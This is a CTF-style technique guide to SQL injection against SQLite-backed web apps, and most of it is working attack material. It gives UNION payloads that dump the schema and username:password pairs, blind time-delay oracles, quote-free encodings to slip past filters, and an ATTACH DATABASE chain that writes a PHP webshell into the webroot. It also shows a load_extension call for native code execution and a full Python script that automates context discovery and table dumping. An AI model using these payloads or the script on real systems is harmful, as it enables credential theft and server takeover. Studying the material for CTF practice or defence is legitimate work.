---
title: "SQL Injection - SQLite Specifics"
category: web
subcategory: sqli
type: technique
tags: [sqli, sql-injection, sqlite, sqlite-master, load-extension, attach-database, randomblob, group-concat, webshell, flask, php, typeof, printf, char, sqlmap, burp]
difficulty: medium
summary: "SQLite has no information_schema, no sleep, and no stacked-query restriction in many drivers -- but it has sqlite_master, ATTACH-to-write-a-file, and load_extension RCE."
when_to_use:
  - "The app is a Flask/Django/Node/PHP CTF challenge with a .db or .sqlite file, or errors mention `unrecognized token` / `no such column`"
  - "`?id=1 AND 1=1` works but `information_schema` queries error with `no such table`"
  - "You need the schema and `sqlite_master` returns rows"
  - "You have SQLi and need file write or RCE and the DB is SQLite"
tools: [sqlmap, burp, sqlite3, curl]
---

## TL;DR

SQLite stores its whole schema, including the original `CREATE TABLE` text, in one table: `sqlite_master`.
One `group_concat(sql)` gives you every table and every column at once. From there: `ATTACH DATABASE` writes
an arbitrary file (a PHP webshell), `load_extension()` loads a .so for direct RCE, and `randomblob()`
substitutes for the missing `SLEEP()`.

## Recognise it

- Error text: `unrecognized token: "'"`, `no such column: x`, `near "...": syntax error`,
  `sqlite3.OperationalError`, `SQLSTATE[HY000]: General error: 1 no such table`.
- `AND (SELECT 1 FROM sqlite_master LIMIT 1)=1` succeeds; `information_schema.tables` errors.
- `AND sqlite_version() LIKE '3%'` is true.
- The app is Flask + `sqlite3`, Django with the default `db.sqlite3`, Node + `better-sqlite3`, or PHP PDO
  with a `sqlite:` DSN.
- `@@version`, `version()`, `DB_NAME()`, `user()` all error -- SQLite has none of them.

## Theory

### Fingerprints

```sql
-- true only on SQLite
' AND sqlite_version() IS NOT NULL-- -
' AND (SELECT count(*) FROM sqlite_master)>=0-- -
' AND typeof(1)='integer'-- -
-- version string
' UNION SELECT sqlite_version(),NULL-- -
-- compile options (tells you if load_extension / fts are available)
' UNION SELECT group_concat(compile_options),NULL FROM pragma_compile_options-- -
```

### Schema in one request

```sql
-- table names
' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'-- -
-- table names AND column names AND types, all at once (this is the big one)
' UNION SELECT group_concat(sql,char(10)),NULL FROM sqlite_master-- -
-- just one table's DDL
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'-- -
-- columns as rows (SQLite 3.16+ table-valued pragma)
' UNION SELECT group_concat(name),NULL FROM pragma_table_info('users')-- -
-- list attached databases / file paths
' UNION SELECT group_concat(file),NULL FROM pragma_database_list-- -
-- indexes and triggers too
' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type IN ('index','trigger','view')-- -
```

On SQLite 3.33+ `sqlite_master` is aliased as `sqlite_schema`; if a WAF blocks `sqlite_master`, try
`sqlite_schema`, or `pragma_table_list` (3.37+).

### Dumping rows

```sql
' UNION SELECT group_concat(username||':'||password,char(10)),NULL FROM users-- -
-- when the column type is not text
' UNION SELECT group_concat(CAST(id AS TEXT)||':'||username),NULL FROM users-- -
-- paging when group_concat truncates in the HTML
' UNION SELECT username||':'||password,NULL FROM users LIMIT 1 OFFSET 3-- -
```

SQLite's `group_concat` has **no length cap** (unlike MySQL), so one request usually gets everything.

### Quoting-free payloads

SQLite has no `0x41` hex-string literal for text, but it has `char()` and `printf()`:

```sql
-- 'users' without quotes
char(117,115,101,114,115)
-- concatenation
char(97)||char(98)
-- printf for formatting
printf('%s',x)
-- hex() / unhex-ish: X'41' IS a valid blob literal and casts to text
CAST(X'7573657273' AS TEXT)
```

`CAST(X'...' AS TEXT)` is the closest thing to MySQL's `0x...` and is the cleanest no-quote primitive.

### Time delay (no SLEEP function)

```sql
-- randomblob burns RNG; calibrate the size once (1e8 ~ 0.1-0.5s, 1e9 ~ 2-5s)
' AND CASE WHEN (substr((SELECT name FROM sqlite_master LIMIT 1),1,1)='u')
  THEN like('a%',char(97)||hex(randomblob(500000000))) ELSE 1 END-- -
-- recursive CTE burn (portable across builds, easier to tune)
' AND (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<5000000) SELECT count(*) FROM c)>0-- -
-- FTS / soundex style burn if compiled in
' AND (SELECT count(*) FROM (SELECT 1 FROM sqlite_master a, sqlite_master b, sqlite_master c))>0-- -
```

### Comments

`--` works (and unlike MySQL does **not** need a trailing space), `/* */` works, `#` does **not**.
The universal-safe terminator is `-- -` or closing the expression yourself with `--`.

### File write via ATTACH DATABASE

`ATTACH DATABASE '/path/x.php' AS pwn` **creates the file** if it does not exist. SQLite writes a
16-byte header (`SQLite format 3\0`), then pages. If you then `CREATE TABLE pwn.a(x TEXT)` and insert
your PHP, the PHP text lands inside the file as raw bytes. PHP ignores everything outside `<?php ... ?>`,
so the binary garbage around it does not matter -- the file still executes.

```sql
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.s (c TEXT);
INSERT INTO pwn.s (c) VALUES ('<?php system($_GET["c"]); ?>');
```

This needs **stacked queries** (three statements). Availability:

| Driver | Stacked queries |
|---|---|
| Python `sqlite3.execute()` | No (one statement only) |
| Python `sqlite3.executescript()` | **Yes** |
| PHP PDO `query()` / `exec()` with sqlite | **Yes** |
| PHP `sqlite_query` / `SQLite3::exec` | **Yes** |
| Node `better-sqlite3` `.exec()` | **Yes**, `.prepare().run()` no |
| Node `node-sqlite3` `.exec()` | **Yes**, `.all()`/`.run()` no |

So the ATTACH chain is realistic exactly when the app used an `exec`-family call.
As a URL parameter (note the `;` separators must survive):

```
?id=1'; ATTACH DATABASE '/var/www/html/s.php' AS p; CREATE TABLE p.x(c TEXT); INSERT INTO p.x VALUES('<?php system($_GET[0]);?>');-- -
```

You can also **overwrite** an existing writable file: ATTACH on an existing non-database file errors
with `file is not a database`, so pick a path that does not exist yet.

### load_extension() RCE

```sql
-- read: is it even available?
' UNION SELECT group_concat(compile_options),NULL FROM pragma_compile_options-- -
-- if OMIT_LOAD_EXTENSION is NOT present, and the driver enabled it:
' UNION SELECT load_extension('/tmp/evil.so','sqlite3_extension_init'),NULL-- -
```

`load_extension` calls `dlopen()` then the named entry point -- arbitrary native code.
Big caveats: it is **disabled by default** in the C API (`sqlite3_enable_load_extension`), Python's
`sqlite3` requires `con.enable_load_extension(True)`, and many distro builds compile it out entirely.
You also need to get a `.so` onto the box first (upload, `/tmp` via another bug, or
`ATTACH`-write a file whose ELF bytes you control -- hard because of the SQLite header prefix).
Treat it as a "check, do not count on it" path.

Because the entry point is reached through `dlopen()`, any shared object the loader initialises
will run its initialisers -- which is why this is a full native-code-execution primitive rather than
a data-access one, and why almost every packaged build disables it. Check
`pragma_compile_options` for `ENABLE_LOAD_EXTENSION` before spending any time here; on a normal
distro build it will be absent and this path is closed.

### Other SQLite-only tricks

- `readfile('/etc/passwd')` and `writefile('/tmp/x','data')` exist **only in the `sqlite3` CLI shell**
  (fileio extension), not in the library. If the challenge shells out to `sqlite3`, they are live.
- `edit()`, `.shell`, `.import`, `.output` are CLI dot-commands -- same story.
- `WITH RECURSIVE` lets you generate a series for brute-forcing:
  `WITH RECURSIVE n(i) AS (SELECT 1 UNION ALL SELECT i+1 FROM n WHERE i<128) SELECT group_concat(char(i)) FROM n`.
- `typeof(col)` tells you whether a column is holding a blob, text, integer, or null -- useful when
  UNION output renders as nothing.
- `json_extract`, `json_each` (3.9+) give you extra table-valued functions to pivot through filters.
- `sqlite_dbpage` (3.31+, if SQLITE_ENABLE_DBPAGE_VTAB) exposes raw database pages:
  `SELECT hex(data) FROM sqlite_dbpage` -- reads deleted rows and other tables' raw bytes.

## Attack

1. Fingerprint with `sqlite_version()`.
2. `group_concat(sql) FROM sqlite_master` -- full schema, one request.
3. Dump the interesting table with `||` concatenation.
4. If you need more than data: test stacked queries with `'; SELECT 1;-- -` (no error = probably allowed).
5. With stacked queries, ATTACH-write a webshell into the webroot. Find the webroot from an error
   message, `/proc/self/environ` via LFI, or just try `/var/www/html`, `/app/static`, `/usr/share/nginx/html`.
6. Check `pragma_compile_options` for `ENABLE_LOAD_EXTENSION` before spending time on that path.

## Code

```python
#!/usr/bin/env python3
"""SQLite SQLi enumerator: fingerprint, full schema dump, table dump, stacked-query probe.

Usage:
    python3 sqlite_sqli.py "http://127.0.0.1:8000/item.php?id=1" schema
    python3 sqlite_sqli.py "http://127.0.0.1:8000/item.php?id=1" dump users
    python3 sqlite_sqli.py "http://127.0.0.1:8000/item.php?id=1" stacked

Assumes a UNION context with `ncols` columns and a printable column at `slot`
(run the union-based finder first, or let this script search for them).
"""
from __future__ import annotations

import re
import sys
import urllib.parse

import requests

MARKER = "qZ9Zq"
TIMEOUT = 15
SESSION = requests.Session()
SESSION.headers["User-Agent"] = "Mozilla/5.0"


def build(url: str, payload: str) -> str:
    """Append the payload to the last query-string parameter."""
    parts = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if not qs:
        raise SystemExit("[-] target URL needs at least one query parameter")
    key, val = qs[-1]
    qs[-1] = (key, val + payload)
    query = "&".join(f"{k}={urllib.parse.quote(v, safe='')}" for k, v in qs)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment))


def get(url: str, payload: str) -> str:
    try:
        return SESSION.get(build(url, payload), timeout=TIMEOUT).text
    except requests.RequestException as exc:
        print(f"[-] request failed: {exc}", file=sys.stderr)
        return ""


def clean(body: str) -> bool:
    bad = ("SQL syntax", "sqlite3.", "unrecognized token", "no such column",
           "Internal Server Error", "Warning:")
    return bool(body) and not any(b in body for b in bad)


def find_context(url: str, cap: int = 12) -> tuple[str, int, int]:
    """Return (quote, ncols, printable_slot). Raises SystemExit if no UNION context exists."""
    for quote in ("", "'", '"'):
        for n in range(1, cap + 1):
            nulls = ",".join(["NULL"] * n)
            if not clean(get(url, f"{quote} UNION SELECT {nulls}-- -")):
                continue
            for slot in range(n):
                cols = ["NULL"] * n
                cols[slot] = f"'{MARKER}'"
                if MARKER in get(url, f"{quote} UNION SELECT {','.join(cols)}-- -"):
                    print(f"[+] context quote={quote!r} ncols={n} slot={slot}")
                    return quote, n, slot
    raise SystemExit("[-] no UNION context found -- fall back to boolean/time blind")


def read(url: str, ctx: tuple[str, int, int], expr: str) -> str:
    """Evaluate a SQL expression and pull the value back out of the page."""
    quote, ncols, slot = ctx
    cols = ["NULL"] * ncols
    cols[slot] = f"'{MARKER}'||({expr})||'{MARKER}'"
    body = get(url, f"{quote} UNION SELECT {','.join(cols)}-- -")
    m = re.search(re.escape(MARKER) + r"(.*?)" + re.escape(MARKER), body, re.S)
    return m.group(1) if m else ""


def fingerprint(url: str, ctx: tuple[str, int, int]) -> None:
    ver = read(url, ctx, "SELECT sqlite_version()")
    print(f"[+] sqlite_version = {ver or 'unknown (maybe not SQLite)'}")
    opts = read(url, ctx, "SELECT group_concat(compile_options) FROM pragma_compile_options")
    if opts:
        interesting = [o for o in opts.split(",") if "LOAD_EXTENSION" in o or "DBPAGE" in o or "FTS" in o]
        print(f"[+] notable compile options: {interesting or 'none'}")


def schema(url: str, ctx: tuple[str, int, int]) -> None:
    ddl = read(url, ctx, "SELECT group_concat(sql,char(10)) FROM sqlite_master")
    if not ddl:
        ddl = read(url, ctx, "SELECT group_concat(sql,char(10)) FROM sqlite_schema")
    print("[+] schema:")
    print(ddl or "    (empty -- try pragma_table_list on 3.37+)")


def dump(url: str, ctx: tuple[str, int, int], table: str) -> None:
    cols = read(url, ctx, f"SELECT group_concat(name) FROM pragma_table_info('{table}')")
    if not cols:
        print(f"[-] no columns for {table!r}")
        return
    print(f"[+] {table}({cols})")
    joined = "||':'||".join(f"CAST({c} AS TEXT)" for c in cols.split(","))
    rows = read(url, ctx, f"SELECT group_concat({joined},char(10)) FROM {table}")
    print(rows or "    (no rows)")


def stacked_probe(url: str, ctx: tuple[str, int, int]) -> None:
    """A second statement only parses if the driver uses an exec-family call."""
    quote = ctx[0]
    body = get(url, f"{quote}; SELECT 1;-- -")
    print("[+] stacked queries look ALLOWED" if clean(body)
          else "[-] stacked queries rejected (prepare/execute driver)")


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000/item.php?id=1"
    mode = sys.argv[2] if len(sys.argv) > 2 else "schema"
    ctx = find_context(url)
    fingerprint(url, ctx)
    if mode == "schema":
        schema(url, ctx)
    elif mode == "dump":
        dump(url, ctx, sys.argv[3] if len(sys.argv) > 3 else "users")
    elif mode == "stacked":
        stacked_probe(url, ctx)
    else:
        raise SystemExit("modes: schema | dump <table> | stacked")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **`sqlite_master` vs `sqlite_schema`.** 3.33+ accepts both. A blacklist usually only knows the old name.
- **`group_concat` row order is not guaranteed.** Add an explicit `ORDER BY` in a subquery if you need
  stable pairing across two separate dumps -- otherwise dump all columns in one concatenated expression.
- **Typed columns render as nothing.** SQLite is dynamically typed, so a BLOB column concatenated with
  `||` can yield an empty string. Wrap in `CAST(x AS TEXT)` or `hex(x)`.
- **`LIMIT` inside a UNION branch** applies to the whole compound statement in SQLite, not just your
  branch. Use a subquery: `(SELECT x FROM t LIMIT 1 OFFSET 3)`.
- **No `SLEEP`.** Every time-based payload has to burn CPU, which is noisy and inconsistent across
  hardware. Calibrate `randomblob` size against the actual target before trusting the oracle.
- **Stacked queries depend entirely on the driver call**, not on SQLite. Probe rather than assume;
  Python's `execute()` will raise `Warning: You can only execute one statement at a time`.
- **The database file may be read-only** (opened with `mode=ro`, or the container filesystem is
  read-only). Then every write path is dead regardless of the SQL.
- **`ATTACH` is often disabled** via `SQLITE_LIMIT_ATTACHED=0` or `SQLITE_OMIT_ATTACH`, and modern
  drivers increasingly open with `SQLITE_OPEN_NOMUTEX|SQLITE_OPEN_READONLY` in web contexts.
- **sqlmap knows SQLite** but its default payload set is tuned for MySQL. Force `--dbms=sqlite` or it
  will waste hundreds of requests on `information_schema`.

## Tools

- `sqlmap -u URL --dbms=sqlite --technique=U --dump` -- force the DBMS, UNION only.
- `sqlmap -u URL --dbms=sqlite --technique=B --string='<marker>'` for the blind case.
- `sqlite3 db.sqlite '.schema'` and `.dump` when you have grabbed the file itself via LFI.
- `file db.sqlite` / `xxd -l 16 db.sqlite` -- confirms the `SQLite format 3` header.
- Burp Repeater for the manual context hunt.

## References

- SQLite documentation -- the schema table: https://www.sqlite.org/schematab.html
- SQLite documentation -- ATTACH: https://www.sqlite.org/lang_attach.html
- SQLite documentation -- run-time loadable extensions: https://www.sqlite.org/loadext.html
- PayloadsAllTheThings -- SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings
